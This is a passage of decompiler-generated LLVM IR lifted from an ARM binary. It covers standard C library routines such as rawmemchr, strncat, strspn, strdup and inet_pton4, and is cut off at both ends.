  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_18a9c = load i32, i32* @r4, align 4
  %v6_18a9c = load i32, i32* @lr, align 4
  %v1_18aa0 = add i32 %arg1, 4
  %v2_18aa0 = inttoptr i32 %v1_18aa0 to i32*
  %v3_18aa0 = load i32, i32* %v2_18aa0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_18aa8 = load i32, i32* %arg2, align 4
  %v3_18aa8 = add i32 %tmp, 4
  %v4_18aa8 = inttoptr i32 %v3_18aa8 to i32*
  %v5_18aa8 = load i32, i32* %v4_18aa8, align 4
  %v6_18aac = call i32 @__libc_lseek64(i32 %v3_18aa0, i32 %v2_18aa8, i32 %v5_18aa8, i32 %arg3, i32 %v3_18a9c, i32 %v6_18a9c)
  %v1_18ab0 = icmp slt i32 %v2_18aa8, 0
  %v6_18aac. = select i1 %v1_18ab0, i32 %v6_18aac, i32 0
  store i32 %v6_18aac., i32* %r3.global-to-local, align 4
  br i1 %v1_18ab0, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_18abc = load i32, i32* @r4, align 4
  %v4_18abc = inttoptr i32 %v3_18abc to i32*
  store i32 %v6_18aac, i32* %v4_18abc, align 4
  %v6_18abc = add i32 %v3_18abc, 4
  %v7_18abc = inttoptr i32 %v6_18abc to i32*
  store i32 %v2_18aa8, i32* %v7_18abc, align 4
  %v0_18ac0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_18ac0 = phi i32 [ %v6_18aac, %entry ], [ %v0_18ac0.pre, %bb ]
  ret i32 %v0_18ac0

; uselistorder directives
  uselistorder i32 %v6_18aac, { 0, 2, 1 }
  uselistorder i32 %v2_18aa8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18aec:
  %v1_18acc = urem i32 %arg1, 256
  store i32 %v1_18acc, i32* @lr, align 4
  %v4_18aec = mul nuw nsw i32 %v1_18acc, 256
  %v5_18aec = or i32 %v4_18aec, %v1_18acc
  %v4_18af4 = mul i32 %v5_18aec, 65536
  %v5_18af4 = or i32 %v4_18af4, %v5_18aec
  %v0_18af8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_18af8

dec_label_pc_18af8:                               ; preds = %dec_label_pc_18b64, %dec_label_pc_18af8, %dec_label_pc_18aec
  %v0_18af8 = phi i32 [ %v0_18af8.pre, %dec_label_pc_18aec ], [ %v4_18af8, %dec_label_pc_18af8 ], [ %v4_18af8, %dec_label_pc_18b64 ]
  %v1_18af8 = inttoptr i32 %v0_18af8 to i32*
  %v2_18af8 = load i32, i32* %v1_18af8, align 4
  %v4_18af8 = add i32 %v0_18af8, 4
  store i32 %v4_18af8, i32* @ip, align 4
  %v2_18b00 = xor i32 %v2_18af8, %v5_18af4
  %v2_18b04 = add i32 %v2_18b00, 2130640639
  %v1_18b0c = sub i32 -1, %v2_18b00
  %v2_18b10 = xor i32 %v2_18b04, %v1_18b0c
  %v2_18b14 = and i32 %v2_18b10, -2130640640
  %v2_18b18 = icmp eq i32 %v2_18b14, 0
  br i1 %v2_18b18, label %dec_label_pc_18af8, label %dec_label_pc_18b20

dec_label_pc_18b20:                               ; preds = %dec_label_pc_18af8
  %v2_18b20 = inttoptr i32 %v0_18af8 to i8*
  %v3_18b20 = load i8, i8* %v2_18b20, align 1
  %v4_18b20 = zext i8 %v3_18b20 to i32
  %v9_18b28 = icmp eq i32 %v4_18b20, %v1_18acc
  store i1 %v9_18b28, i1* @cpsr_z, align 1
  %v1_18b2c = add i32 %v0_18af8, 3
  %v1_18b30 = add i32 %v0_18af8, 1
  %v1_18b34 = add i32 %v0_18af8, 2
  br i1 %v9_18b28, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_18b20
  ret i32 %v0_18af8

bb18:                                             ; preds = %dec_label_pc_18b20
  %v2_18b3c = inttoptr i32 %v1_18b30 to i8*
  %v3_18b3c = load i8, i8* %v2_18b3c, align 1
  %v4_18b3c = zext i8 %v3_18b3c to i32
  %v9_18b40 = icmp eq i32 %v4_18b3c, %v1_18acc
  store i1 %v9_18b40, i1* @cpsr_z, align 1
  br i1 %v9_18b40, label %dec_label_pc_18b48, label %dec_label_pc_18b50

dec_label_pc_18b48:                               ; preds = %bb18
  ret i32 %v1_18b30

dec_label_pc_18b50:                               ; preds = %bb18
  %v2_18b50 = inttoptr i32 %v1_18b34 to i8*
  %v3_18b50 = load i8, i8* %v2_18b50, align 1
  %v4_18b50 = zext i8 %v3_18b50 to i32
  %v9_18b54 = icmp eq i32 %v4_18b50, %v1_18acc
  store i1 %v9_18b54, i1* @cpsr_z, align 1
  br i1 %v9_18b54, label %dec_label_pc_18b5c, label %dec_label_pc_18b64

dec_label_pc_18b5c:                               ; preds = %dec_label_pc_18b50
  ret i32 %v1_18b34

dec_label_pc_18b64:                               ; preds = %dec_label_pc_18b50
  %v2_18b64 = inttoptr i32 %v1_18b2c to i8*
  %v3_18b64 = load i8, i8* %v2_18b64, align 1
  %v4_18b64 = zext i8 %v3_18b64 to i32
  %v9_18b68 = icmp eq i32 %v4_18b64, %v1_18acc
  store i1 %v9_18b68, i1* @cpsr_z, align 1
  br i1 %v9_18b68, label %dec_label_pc_18b70, label %dec_label_pc_18af8

dec_label_pc_18b70:                               ; preds = %dec_label_pc_18b64
  ret i32 %v1_18b2c

; uselistorder directives
  uselistorder i32 %v4_18af8, { 2, 1, 0 }
  uselistorder i32 %v0_18af8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_18aec, { 1, 0 }
  uselistorder i32 %v1_18acc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 2, 3, 14, 4, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18b80 = load i32, i32* @r4, align 4
  store i32 %v3_18b80, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18b8c

dec_label_pc_18b8c:                               ; preds = %dec_label_pc_18b8c, %entry
  %v0_18b8c = phi i32 [ %v5_18b8c, %dec_label_pc_18b8c ], [ %tmp, %entry ]
  %v1_18b8c = inttoptr i32 %v0_18b8c to i8*
  %v2_18b8c = load i8, i8* %v1_18b8c, align 1
  %v3_18b8c = zext i8 %v2_18b8c to i32
  store i32 %v3_18b8c, i32* %ip.global-to-local, align 4
  %v5_18b8c = add i32 %v0_18b8c, 1
  store i32 %v5_18b8c, i32* %r3.global-to-local, align 4
  %v2_18b90 = icmp eq i8 %v2_18b8c, 0
  store i1 %v2_18b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b90, label %dec_label_pc_18b98, label %dec_label_pc_18b8c

dec_label_pc_18b98:                               ; preds = %dec_label_pc_18b8c
  %v0_18b98 = load i32, i32* %r2.global-to-local, align 4
  %v7_18b98 = icmp eq i32 %v0_18b98, 3
  store i1 %v7_18b98, i1* %cpsr_z.global-to-local, align 1
  %v1_18b9c = add i32 %v0_18b8c, -1
  store i32 %v1_18b9c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_18b98, 4
  br i1 %tmp10, label %dec_label_pc_18c30thread-pre-split, label %dec_label_pc_18ba4

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b98
  %v3_18ba4 = udiv i32 %v0_18b98, 4
  store i32 %v3_18ba4, i32* %r0.global-to-local, align 4
  %v0_18ba8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18c08, %dec_label_pc_18ba4
  %v2_18bb0 = phi i32 [ %v1_18c00, %dec_label_pc_18c08 ], [ %v1_18b9c, %dec_label_pc_18ba4 ]
  %v0_18ba8 = phi i32 [ %v1_18bfc, %dec_label_pc_18c08 ], [ %v0_18ba8.pre, %dec_label_pc_18ba4 ]
  %v1_18ba8 = inttoptr i32 %v0_18ba8 to i8*
  %v2_18ba8 = load i8, i8* %v1_18ba8, align 1
  %v3_18ba8 = zext i8 %v2_18ba8 to i32
  store i32 %v3_18ba8, i32* %r3.global-to-local, align 4
  %v2_18bac = icmp eq i8 %v2_18ba8, 0
  store i1 %v2_18bac, i1* %cpsr_z.global-to-local, align 1
  %v3_18bb0 = add i32 %v2_18bb0, 1
  %v4_18bb0 = inttoptr i32 %v3_18bb0 to i8*
  store i8 %v2_18ba8, i8* %v4_18bb0, align 1
  %v0_18bb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_18bb4 = add i32 %v0_18bb4, 1
  store i32 %v1_18bb4, i32* %ip.global-to-local, align 4
  %v0_18bb8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18bb8, label %.loopexit, label %dec_label_pc_18bbc

dec_label_pc_18bbc:                               ; preds = %dec_label_pc_18ba8
  %v0_18bbc = load i32, i32* @r1, align 4
  %v1_18bbc = add i32 %v0_18bbc, 1
  %v2_18bbc = inttoptr i32 %v1_18bbc to i8*
  %v3_18bbc = load i8, i8* %v2_18bbc, align 1
  %v4_18bbc = zext i8 %v3_18bbc to i32
  store i32 %v4_18bbc, i32* %r3.global-to-local, align 4
  %v2_18bc0 = icmp eq i8 %v3_18bbc, 0
  store i1 %v2_18bc0, i1* %cpsr_z.global-to-local, align 1
  %v3_18bc4 = add i32 %v0_18bb4, 2
  %v4_18bc4 = inttoptr i32 %v3_18bc4 to i8*
  store i8 %v3_18bbc, i8* %v4_18bc4, align 1
  %v0_18bc8 = load i32, i32* @r1, align 4
  %v1_18bc8 = add i32 %v0_18bc8, 1
  store i32 %v1_18bc8, i32* %r1.global-to-local, align 4
  %v0_18bcc = load i32, i32* %ip.global-to-local, align 4
  %v1_18bcc = add i32 %v0_18bcc, 1
  store i32 %v1_18bcc, i32* %ip.global-to-local, align 4
  %v0_18bd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18bd0, label %.loopexit, label %dec_label_pc_18bd4

dec_label_pc_18bd4:                               ; preds = %dec_label_pc_18bbc
  %v1_18bd4 = add i32 %v0_18bc8, 2
  %v2_18bd4 = inttoptr i32 %v1_18bd4 to i8*
  %v3_18bd4 = load i8, i8* %v2_18bd4, align 1
  %v4_18bd4 = zext i8 %v3_18bd4 to i32
  store i32 %v4_18bd4, i32* %r3.global-to-local, align 4
  %v2_18bd8 = icmp eq i8 %v3_18bd4, 0
  store i1 %v2_18bd8, i1* %cpsr_z.global-to-local, align 1
  %v3_18bdc = add i32 %v0_18bcc, 2
  %v4_18bdc = inttoptr i32 %v3_18bdc to i8*
  store i8 %v3_18bd4, i8* %v4_18bdc, align 1
  %v0_18be0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18be0 = add i32 %v0_18be0, 1
  store i32 %v1_18be0, i32* %r1.global-to-local, align 4
  %v0_18be4 = load i32, i32* %ip.global-to-local, align 4
  %v1_18be4 = add i32 %v0_18be4, 1
  store i32 %v1_18be4, i32* %lr.global-to-local, align 4
  %v0_18be8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18be8, label %.loopexit, label %dec_label_pc_18bec

dec_label_pc_18bec:                               ; preds = %dec_label_pc_18bd4
  %v1_18bec = add i32 %v0_18be0, 2
  %v2_18bec = inttoptr i32 %v1_18bec to i8*
  %v3_18bec = load i8, i8* %v2_18bec, align 1
  %v4_18bec = zext i8 %v3_18bec to i32
  store i32 %v4_18bec, i32* %ip.global-to-local, align 4
  store i32 %v1_18bec, i32* %r3.global-to-local, align 4
  %v2_18bf4 = icmp eq i8 %v3_18bec, 0
  store i1 %v2_18bf4, i1* %cpsr_z.global-to-local, align 1
  %v3_18bf8 = add i32 %v0_18be4, 2
  %v4_18bf8 = inttoptr i32 %v3_18bf8 to i8*
  store i8 %v3_18bec, i8* %v4_18bf8, align 1
  %v0_18bfc = load i32, i32* %r3.global-to-local, align 4
  %v1_18bfc = add i32 %v0_18bfc, 1
  store i32 %v1_18bfc, i32* @r1, align 4
  %v0_18c00 = load i32, i32* %lr.global-to-local, align 4
  %v1_18c00 = add i32 %v0_18c00, 1
  store i32 %v1_18c00, i32* %lr.global-to-local, align 4
  %v0_18c04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c04, label %.loopexit, label %dec_label_pc_18c08

dec_label_pc_18c08:                               ; preds = %dec_label_pc_18bec
  %v0_18c08 = load i32, i32* %r0.global-to-local, align 4
  %v1_18c08 = add i32 %v0_18c08, -1
  store i32 %v1_18c08, i32* %r0.global-to-local, align 4
  %v7_18c08 = icmp eq i32 %v0_18c08, 1
  store i1 %v7_18c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c08, label %dec_label_pc_18c10, label %dec_label_pc_18ba8

dec_label_pc_18c10:                               ; preds = %dec_label_pc_18c08
  %v0_18c10 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c10 = urem i32 %v0_18c10, 4
  store i32 %v1_18c10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18c30

dec_label_pc_18c18:                               ; preds = %dec_label_pc_18c30
  %v0_18c18 = load i32, i32* @r1, align 4
  %v1_18c18 = inttoptr i32 %v0_18c18 to i8*
  %v2_18c18 = load i8, i8* %v1_18c18, align 1
  %v3_18c18 = zext i8 %v2_18c18 to i32
  store i32 %v3_18c18, i32* %ip.global-to-local, align 4
  %v2_18c1c = icmp eq i8 %v2_18c18, 0
  store i1 %v2_18c1c, i1* %cpsr_z.global-to-local, align 1
  %v1_18c20 = add i32 %v1_18c3c, -1
  store i32 %v1_18c20, i32* %r2.global-to-local, align 4
  %v3_18c24 = add i32 %v3_18c3c, 1
  %v4_18c24 = inttoptr i32 %v3_18c24 to i8*
  store i8 %v2_18c18, i8* %v4_18c24, align 1
  %v5_18c24 = load i32, i32* %lr.global-to-local, align 4
  %v6_18c24 = add i32 %v5_18c24, 1
  store i32 %v6_18c24, i32* %lr.global-to-local, align 4
  %v0_18c28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c28, label %.loopexit, label %dec_label_pc_18c2c

dec_label_pc_18c2c:                               ; preds = %dec_label_pc_18c18
  %v0_18c2c = load i32, i32* @r1, align 4
  %v1_18c2c = add i32 %v0_18c2c, 1
  store i32 %v1_18c2c, i32* @r1, align 4
  %v0_18c30.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18c30thread-pre-split

dec_label_pc_18c30thread-pre-split:               ; preds = %dec_label_pc_18c2c, %dec_label_pc_18b98
  %v2_18c246 = phi i32 [ %v6_18c24, %dec_label_pc_18c2c ], [ %v1_18b9c, %dec_label_pc_18b98 ]
  %v0_18c30.pr = phi i32 [ %v0_18c30.pr.pre, %dec_label_pc_18c2c ], [ %v0_18b98, %dec_label_pc_18b98 ]
  br label %dec_label_pc_18c30

dec_label_pc_18c30:                               ; preds = %dec_label_pc_18c30thread-pre-split, %dec_label_pc_18c10
  %v3_18c3c = phi i32 [ %v2_18c246, %dec_label_pc_18c30thread-pre-split ], [ %v1_18c00, %dec_label_pc_18c10 ]
  %v1_18c3c = phi i32 [ %v0_18c30.pr, %dec_label_pc_18c30thread-pre-split ], [ %v1_18c10, %dec_label_pc_18c10 ]
  %v2_18c30 = icmp eq i32 %v1_18c3c, 0
  store i1 %v2_18c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c30, label %dec_label_pc_18c38, label %dec_label_pc_18c18

dec_label_pc_18c38:                               ; preds = %dec_label_pc_18c30
  %v0_18c38 = load i32, i32* %ip.global-to-local, align 4
  %v2_18c38 = icmp eq i32 %v0_18c38, 0
  store i1 %v2_18c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c38, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_18c38
  %v4_18c3c = add i32 %v3_18c3c, 1
  %v5_18c3c = inttoptr i32 %v4_18c3c to i8*
  store i8 0, i8* %v5_18c3c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_18bec, %dec_label_pc_18bd4, %dec_label_pc_18bbc, %dec_label_pc_18ba8, %dec_label_pc_18c18, %dec_label_pc_18c38, %bb
  %v0_18c40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18c40, i32* %r0.global-to-local, align 4
  %v2_18c44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18c44, i32* @r4, align 4
  ret i32 %v0_18c40

; uselistorder directives
  uselistorder i32 %v1_18c3c, { 1, 0 }
  uselistorder i32 %v1_18c10, { 1, 0 }
  uselistorder i32 %v0_18c08, { 1, 0 }
  uselistorder i32 %v1_18c00, { 0, 2, 1 }
  uselistorder i32 %v1_18bfc, { 1, 0 }
  uselistorder i32 %v0_18b98, { 2, 1, 0, 3 }
  uselistorder i32 %v5_18b8c, { 1, 0 }
  uselistorder i32 %v0_18b8c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_18c802 = load i32, i32* @r0, align 4
  %v1_18c803 = inttoptr i32 %v0_18c802 to i8*
  %v2_18c804 = load i8, i8* %v1_18c803, align 1
  %v2_18c846 = icmp eq i8 %v2_18c804, 0
  br i1 %v2_18c846, label %dec_label_pc_18c90, label %dec_label_pc_18c5c.preheader

dec_label_pc_18c54:                               ; preds = %dec_label_pc_18c5c
  %v1_18c64 = add i32 %v0_18c64, 1
  %v9_18c54 = icmp eq i8 %v0_18c70.in, %v2_18c5c
  br i1 %v9_18c54, label %dec_label_pc_18c70, label %dec_label_pc_18c5c

dec_label_pc_18c5c:                               ; preds = %dec_label_pc_18c5c.preheader, %dec_label_pc_18c54
  %v0_18c64 = phi i32 [ %tmp, %dec_label_pc_18c5c.preheader ], [ %v1_18c64, %dec_label_pc_18c54 ]
  %v1_18c5c = inttoptr i32 %v0_18c64 to i8*
  %v2_18c5c = load i8, i8* %v1_18c5c, align 1
  %v3_18c5c = zext i8 %v2_18c5c to i32
  store i32 %v3_18c5c, i32* @ip, align 4
  %v2_18c60 = icmp eq i8 %v2_18c5c, 0
  br i1 %v2_18c60, label %dec_label_pc_18c90, label %dec_label_pc_18c54

dec_label_pc_18c70:                               ; preds = %dec_label_pc_18c54
  %v2_18c70 = icmp eq i8 %v0_18c70.in, 0
  br i1 %v2_18c70, label %dec_label_pc_18c90, label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %dec_label_pc_18c70
  %v1_18c78 = add i32 %v0_18c78, 1
  store i32 %v1_18c78, i32* @lr, align 4
  %v1_18c7c = add i32 %v0_18c7c, 1
  %v1_18c80 = inttoptr i32 %v1_18c7c to i8*
  %v2_18c80 = load i8, i8* %v1_18c80, align 1
  %v2_18c84 = icmp eq i8 %v2_18c80, 0
  br i1 %v2_18c84, label %dec_label_pc_18c90, label %dec_label_pc_18c5c.preheader

dec_label_pc_18c5c.preheader:                     ; preds = %entry, %dec_label_pc_18c78
  %v0_18c7c = phi i32 [ %v1_18c7c, %dec_label_pc_18c78 ], [ %v0_18c802, %entry ]
  %v0_18c78 = phi i32 [ %v1_18c78, %dec_label_pc_18c78 ], [ 0, %entry ]
  %v0_18c70.in = phi i8 [ %v2_18c80, %dec_label_pc_18c78 ], [ %v2_18c804, %entry ]
  br label %dec_label_pc_18c5c

dec_label_pc_18c90:                               ; preds = %dec_label_pc_18c70, %dec_label_pc_18c78, %dec_label_pc_18c5c, %entry
  %v0_18c90 = phi i32 [ 0, %entry ], [ %v0_18c78, %dec_label_pc_18c5c ], [ %v1_18c78, %dec_label_pc_18c78 ], [ %v0_18c78, %dec_label_pc_18c70 ]
  ret i32 %v0_18c90

; uselistorder directives
  uselistorder i8 %v0_18c70.in, { 1, 0 }
  uselistorder i8 %v2_18c5c, { 1, 2, 0 }
  uselistorder i32 %v0_18c64, { 1, 0 }
  uselistorder i32* @ip, { 14, 15, 3, 16, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 6, 7, 0, 8, 9, 10, 11, 12, 25, 26, 5, 27, 4, 28, 19, 20, 2, 21, 22, 18, 23, 80, 77, 78, 79, 1, 81, 13, 17, 24, 31, 30, 29, 32, 33 }
  uselistorder label %dec_label_pc_18c90, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18c5c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_18c98 = load i32, i32* @r4, align 4
  store i32 %v3_18c98, i32* %stack_var_-12, align 4
  %v6_18c98 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_18ca0 = call i32 @strlen(i8* %arg1)
  %v1_18ca4 = add i32 %v3_18ca0, 1
  store i32 %v1_18ca4, i32* @r4, align 4
  %v1_18cac = call i32 @malloc(i32 %v1_18ca4)
  store i32 101568, i32* @lr, align 4
  %v1_18cbc = icmp ne i32 %v1_18cac, 0
  call void @__pseudo_cond_branch(i1 %v1_18cbc, i32 ptrtoint ([3 x i8]* @global_var_13e10.1247 to i32))
  %v2_18cc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18cc4, i32* @r4, align 4
  store i32 %v6_18c98, i32* @r5, align 4
  ret i32 %v1_18cac

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 9, 10, 11, 8, 15, 13, 14, 12, 6, 2, 3, 0, 7, 1, 5 }
  uselistorder i32 (i32)* @malloc, { 8, 5, 4, 14, 15, 7, 6, 13, 12, 11, 10, 9, 3, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_18cc8 = load i32, i32* @r5, align 4
  %v2_18cd0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_18cd0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_18d583 = load i8, i8* %arg1, align 1
  %v3_18d584 = zext i8 %v2_18d583 to i32
  %v5_18d585 = add i32 %tmp, 1
  store i32 %v5_18d585, i32* @r4, align 4
  %v2_18d5c6 = icmp eq i8 %v2_18d583, 0
  store i1 %v2_18d5c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d5c6, label %dec_label_pc_18d68, label %dec_label_pc_18cf0

dec_label_pc_18cf0:                               ; preds = %entry, %dec_label_pc_18d58.backedge
  %v0_18d34 = phi i32 [ %v3_18d58, %dec_label_pc_18d58.backedge ], [ %v3_18d584, %entry ]
  %v1_18d6010.in = phi i32 [ %v3_18d58, %dec_label_pc_18d58.backedge ], [ %v3_18d584, %entry ]
  %v1_18d6010 = add nsw i32 %v1_18d6010.in, -48
  %v2_18cf0 = icmp ugt i32 %v1_18d6010, 8
  %v7_18cf0 = icmp eq i32 %v1_18d6010, 9
  store i1 %v7_18cf0, i1* %cpsr_z.global-to-local, align 1
  %v2_18cf8 = xor i1 %v7_18cf0, true
  %v3_18cf8 = and i1 %v2_18cf0, %v2_18cf8
  br i1 %v3_18cf8, label %dec_label_pc_18d34, label %dec_label_pc_18cfc

dec_label_pc_18cfc:                               ; preds = %dec_label_pc_18cf0
  %v0_18cfc = load i32, i32* %r0.global-to-local, align 4
  %v1_18cfc = inttoptr i32 %v0_18cfc to i8*
  %v2_18cfc = load i8, i8* %v1_18cfc, align 1
  %v3_18cfc = zext i8 %v2_18cfc to i32
  %v3_18d04 = mul nuw nsw i32 %v3_18cfc, 10
  %v4_18d04 = add nuw nsw i32 %v3_18d04, %v0_18d34
  %v1_18d08 = add nsw i32 %v4_18d04, -48
  %v2_18d0c = icmp ugt i32 %v1_18d08, 254
  %v7_18d0c = icmp eq i32 %v1_18d08, 255
  store i1 %v7_18d0c, i1* %cpsr_z.global-to-local, align 1
  %v2_18d10 = xor i1 %v7_18d0c, true
  %v3_18d10 = and i1 %v2_18d0c, %v2_18d10
  br i1 %v3_18d10, label %dec_label_pc_18d8c, label %dec_label_pc_18d14

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18cfc
  %v0_18d14 = load i32, i32* %r1.global-to-local, align 4
  %v2_18d14 = icmp eq i32 %v0_18d14, 0
  store i1 %v2_18d14, i1* %cpsr_z.global-to-local, align 1
  %v1_18d18 = trunc i32 %v1_18d08 to i8
  store i8 %v1_18d18, i8* %v1_18cfc, align 1
  %v0_18d1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d1c, label %dec_label_pc_18d20, label %dec_label_pc_18d58.backedge

dec_label_pc_18d20:                               ; preds = %dec_label_pc_18d14
  %v0_18d20 = load i32, i32* @lr, align 4
  %v1_18d20 = add i32 %v0_18d20, 1
  store i32 %v1_18d20, i32* @lr, align 4
  %v7_18d24 = icmp eq i32 %v1_18d20, 4
  store i1 %v7_18d24, i1* %cpsr_z.global-to-local, align 1
  %v0_18d28 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d28 = add i32 %v0_18d28, 1
  store i32 %v1_18d28, i32* %r1.global-to-local, align 4
  %v8_18d2c = icmp sgt i32 %v1_18d20, 4
  br i1 %v8_18d2c, label %dec_label_pc_18d8c, label %dec_label_pc_18d58.backedge

dec_label_pc_18d34:                               ; preds = %dec_label_pc_18cf0
  %v7_18d34 = icmp eq i32 %v0_18d34, 46
  store i1 %v7_18d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d34, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_18d34
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d8c

bb:                                               ; preds = %dec_label_pc_18d34
  %v1_18d3c = load i32, i32* %r1.global-to-local, align 4
  %v2_18d3c = urem i32 %v1_18d3c, 2
  %v2_18d40 = icmp eq i32 %v2_18d3c, 0
  store i1 %v2_18d40, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_18d40, label %dec_label_pc_18d8c, label %dec_label_pc_18d4c

dec_label_pc_18d4c:                               ; preds = %bb
  %v0_18d4c = load i32, i32* @lr, align 4
  %v7_18d4c = icmp eq i32 %v0_18d4c, 4
  store i1 %v7_18d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d4c, label %dec_label_pc_18d8c, label %dec_label_pc_18d54

dec_label_pc_18d54:                               ; preds = %dec_label_pc_18d4c
  %v2_18d54 = load i32, i32* %r0.global-to-local, align 4
  %v3_18d54 = add i32 %v2_18d54, 1
  %v4_18d54 = inttoptr i32 %v3_18d54 to i8*
  store i8 0, i8* %v4_18d54, align 1
  %v5_18d54 = load i32, i32* %r0.global-to-local, align 4
  %v6_18d54 = add i32 %v5_18d54, 1
  store i32 %v6_18d54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18d58.backedge

dec_label_pc_18d58.backedge:                      ; preds = %dec_label_pc_18d54, %dec_label_pc_18d14, %dec_label_pc_18d20
  %v0_18d58 = load i32, i32* @r4, align 4
  %v1_18d58 = inttoptr i32 %v0_18d58 to i8*
  %v2_18d58 = load i8, i8* %v1_18d58, align 1
  %v3_18d58 = zext i8 %v2_18d58 to i32
  %v5_18d58 = add i32 %v0_18d58, 1
  store i32 %v5_18d58, i32* @r4, align 4
